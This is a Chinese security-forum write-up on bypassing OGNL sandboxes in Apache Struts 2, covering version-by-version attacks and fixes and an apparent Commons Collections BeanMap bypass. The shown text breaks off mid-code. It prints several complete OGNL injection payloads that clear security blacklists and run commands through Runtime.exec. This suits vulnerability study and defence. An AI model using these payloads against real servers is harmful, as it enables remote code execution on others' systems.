---
title: ognl+cc 依赖绕过沙箱
url: https://forum.butian.net/share/4037
source: 奇安信攻防社区
date: 2025-01-15
fetch_date: 2025-10-06T20:09:14.317453
---

# ognl+cc 依赖绕过沙箱

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### ognl+cc 依赖绕过沙箱

* [漏洞分析](https://forum.butian.net/topic/48)

ognl+cc 依赖绕过沙箱
前言
今天晚上稍微看了一下 Struct2 攻防，然后无意间通过链接跳转，跳转，再跳转，翻到了一位外国老哥的文章，绕过可谓是淋漓尽致，整激动了，感觉能在如此沙箱下绕过，...

ognl+cc 依赖绕过沙箱
==============
前言
--
今天晚上稍微看了一下 Struct2 攻防，然后无意间通过链接跳转，跳转，再跳转，翻到了一位外国老哥的文章，绕过可谓是淋漓尽致，整激动了，感觉能在如此沙箱下绕过，简直是神人，下面来慢慢分析
[https://github.blog/security/vulnerability-research/bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY\\_velocity.struts2.context](https://github.blog/security/vulnerability-research/bypassing-ognl-sandboxes-for-fun-and-charities/?ref=blog.projectdiscovery.io#strutsutil:~:text=(PageContextImpl)-,For%20Velocity%3A,-.KEY\_velocity.struts2.context)
<https://securitylab.github.com/research/ognl-apache-struts-exploit-CVE-2018-11776/>
基础知识
----
### Struct2
Apache Struts 2（通常简称为 Struts 2）是一个基于 Java 的开源 Web 应用框架，主要用于开发 Java EE（企业级）应用程序。它通过基于模型-视图-控制器（MVC）设计模式提供了灵活的 Web 应用开发能力。
当然现在 spring 是更胜一筹了，它已经老了，新生代开始接替了，而且我不得不说，ognl 表达式漏洞能被研究如此地步，这个前代的老人功不可没
在 Struts 2 框架中，OGNL (Object-Graph Navigation Language) 是一个非常重要的功能，它被广泛应用于表达式语言（EL）中，用于在 Struts 2 中访问和操作 Java 对象的属性。OGNL 使得 Struts 2 可以非常灵活地动态处理数据，并且与模型-视图-控制器（MVC）模式紧密集成。
### OGNL 表达式
支持对象方法调用，如 `objName.methodName()`；
- 支持类静态方法调用和值访问，表达式的格式为`@\[类全名（包括包路径）\]@\[方法名|值名\]``，如@java.lang.String@format(‘fruit%s’,’frt’)；
- 访问OGNL上下文（OGNL context）和ActionContext；
- 可以直接new一个对象
操作符
`.`操作符：如上所示，可以调用对象的属性和方法
`@`操作符：用于调用静态对象、静态方法、静态变量
`#`操作符：定义变量,用于调用非root对象
比如
@ java.lang.Runtime@getRuntime ().exec('calc')
其中的一些重要的内置对象
attr：保存着上面三个作用域的所有属性，如果有重复的则以 request 域中的属性为基准；
VALUE\\_STACK：值栈，保存着 valueStack 对象，也就是说可以通过 ActionContext 访问到 valueStack 中的值；
下面的绕过会用到，因为绕过需要 content 对象，而这个对象可以从 attr 和 VALUE\\_STACK 中获取
Struct2 的攻防历史
-------------
我们知道在 OGNL 使用 # 符号可以访问各种全局对象
两个重要的角色，也一直是攻击和防御的核心
`第一个是 \_memberAccess，它是一个 SecurityMemberAccess 对象，用于控制 OGNL 可以做什么，另一个是 context，它允许访问更多对象，其中许多对象对漏洞利用构建很有用。`
### 静态方法调用
#### 绕过
一开始ognl 设置了一个属性，来禁用静态方法 allowStaticMethodAccess
但是可以通过如下方法
```java
#\_memberAccess['allowStaticMethodAccess']=true
```
然后
```java
@java.lang.Runtime@getRuntime().exec('calc')
```
这个payload 就可以执行了
#### 修复
在 2.3.14.1 及更高版本中，allowStaticMethodAccess 变为 final，无法再更改。
### 实例化对象调用方法
不可以调用静态方法后，但是还允许构造任意类并访问其公共方法，所以其实我们根本不需要调用静态方法就可以执行命令
```java
(#p=new java.lang.ProcessBuilder('calc')).(#p.start())
```
### 黑名单
在 2.3.20 中，引入了黑名单 excludedClasses、excludedPackageNames 和 excludedPackageNamePatterns
而且禁用了构造函数的调用，不能使用静态方法
绕过点在于\\_memberAccess 仍然可以访问，而且 DefaultMemberAccess 对象任然允许静态方法和构造函数的调用
所以我们替换\\_memberAccess 来置空黑名单绕过
```java
(#\_memberAccess=@ognl.OgnlContext@DEFAULT\_MEMBER\_ACCESS).(@java.lang.Runtime@getRuntime().exec('calc'))
```
### 实例化 OgnlUtil
之后把类 ognl.MemberAccess 和 ognl.DefaultMemberAccess 放在了我们的黑名单中
这里使用的是实例化 OgnlUtil 对象去置空黑名单
我们的 container 中 getInstance 方法可以实例化 OgnlUtil 类
而\\_memberAccess 的初始化是
createActionContext 方法创建新的 ActionContext，会调用 OgnlValueStack 的 setOgnlUtil 方法，以使用 OgnlUtil 的全局实例初始化 OgnlValueStack 的 securityMemberAccess，这样置空\\_memberAccess 的黑名单
```java
(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT\_MEMBER\_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))
```
### 绕过clear
在之后的版本中，我们的黑名单不再可以使用clear 置空，视乎黑名单不可以再被删除
但是我们可以调用对于的setter 方法去设置一个空的黑名单
```java
(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames('')).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT\_MEMBER\_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))
```
可惜从栈中得到的 ognlUtil 只是当前栈的
`\\_memberAccess 是一个瞬态对象，它是在创建新的 ActionContext 期间当请求进入时创建的。每次通过 createActionContext 方法创建新的 ActionContext 时，都会调用 setOgnlUtil 方法，以使用全局 ognlUtil 中的 excludedClasses、excludedPackageNames 等黑名单创建\\_memberAccess。因此，通过重新发送请求，新创建的 \\_memberAccess 将清空其列入黑名单的类和包，从而允许我们执行任意代码。整理了有效载荷，我以这两个有效载荷结束。第一个选项清空 excludedClasses 和 excludedPackageNames 黑名单
```java
(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))
```
```java
(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT\_MEMBER\_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))
```
配合cc 依赖的最后一舞
------------
我们看看到我们的S0-61
现在已经变成什么模样了呢
- 无法 new 一个对象
- 无法调用黑名单类和包的方法、属性
- 无法使用反射
- 无法调用静态方法
黑名单
```java
public static Object invokeMethod(Object target, Method method, Object[] argsArray) throws InvocationTargetException, IllegalAccessException { if (\_useStricterInvocation) { Class methodDeclaringClass = method.getDeclaringClass(); if (AO\_SETACCESSIBLE\_REF != null &amp;&amp; AO\_SETACCESSIBLE\_REF.equals(method) || AO\_SETACCESSIBLE\_ARR\_REF != null &amp;&amp; AO\_SETACCESSIBLE\_ARR\_REF.equals(method) || SYS\_EXIT\_REF != null &amp;&amp; SYS\_EXIT\_REF.equals(method) || SYS\_CONSOLE\_REF != null &amp;&amp; SYS\_CONSOLE\_REF.equals(method) || AccessibleObjectHandler.class.isAssignableFrom(methodDeclaringClass) || ClassResolver.class.isAssignableFrom(methodDeclaringClass) || MethodAccessor.class.isAssignableFrom(methodDeclaringClass) || MemberAccess.class.isAssignableFrom(methodDeclaringClass) || OgnlContext.class.isAssignableFrom(methodDeclaringClass) || Runtime.class.isAssignableFrom(methodDeclaringClass) || ClassLoader.class.isAssignableFrom(methodDeclaringClass) || ProcessBuilder.class.isAssignableFrom(methodDeclaringClass) || AccessibleObjectHandlerJDK9Plus.unsafeOrDescendant(methodDeclaringClass)) { throw new IllegalAccessException("Method [" + method + "] cannot be called from within OGNL invokeMethod() " + "under stricter invocation mode."); } }
```
简直寸步难行，总结下来我们可以干的有两件事
可以访问对象的属性，调用已经实例化好对象的一些方法
两个条件连起来，那我们必须找一个属性，而这个属性本身就是一个实例化对象，而且这个实例化对象中有可以恶意利用的方法
这时候我们就需要利用ognl 表达式中的一些对象了
![img](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-3f8d3dea3a25f05b8e8e8e6abd8c788f75884df7.png)
`而 #application` 中的 `org.apache.tomcat.InstanceManager` ，他 value 为org.apache.catalina.core.DefaultInstanceManager ` 的实例化对象，该类为tomcat中的类
看到它的方法
![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-e5f472137209a450629db4a6941b8df8fcb25540.png)
其中传入的参数是我们可以控制的，这样我们就可以绕过不能实例化类的限制
但是还是有个问题，黑名单中禁用了我们需要的类，如何置空黑名单是一个问题
纵观前面置空的方法
从content，attr，等等属性中获取的方法都已经被加入到了黑名单中
不过这里关键就在于有cc 依赖，因为是可以通过getter，setter 方法访问属性的
关键类就是
org.apache.commons.collections.BeanMap
它有一个setbean 方法
```java
public void setBean( Object newBean ) {
bean = newBean;
reinitialise();
}
```
跟进 reinitialise 方法
```java
protected void reinitialise() {
readMethods.clear();
writeMethods.clear();
types.clear();
initialise();
}
```
跟进 initialise 方法
```java
private void initialise() {
if(getBean() == null) return;
Class beanClass = getBean().getClass();
try {
//BeanInfo beanInfo = Introspector.getBeanInfo( bean, null );
BeanInfo beanInfo = Introspector.getBeanInfo( beanClass );
PropertyDescriptor[] ...